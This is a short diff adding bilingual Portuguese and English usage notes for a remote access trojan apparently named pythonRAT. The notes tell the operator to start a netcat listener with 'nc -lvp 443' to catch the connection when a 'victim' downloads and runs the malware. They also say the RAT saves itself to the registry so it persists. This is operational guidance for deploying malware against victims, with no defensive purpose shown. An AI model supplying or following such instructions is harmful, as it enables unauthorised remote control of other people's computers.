@@ -1,0 +1,15 @@
+pt br
+
+
+Voce ira precisar do NETCAT.
+Com o NETCAT em maos use o comando : nc -lvp 443
+Quanto sua vitima baixar o malware e executar, o netcat recebera a conexao! 
+Lembrando que o pythonRAT compila os servers em modo PERSISTENTE os salvando nos registros.
+
+
+en us 
+
+You will need NETCAT.
+With NETCAT in hand use the command: nc -lvp 443
+When your victim downloads the malware and executes, netcat will receive the connection!
+Remembering that pythonRAT compiles the servers in PERSISTENT mode by saving them in the registers.
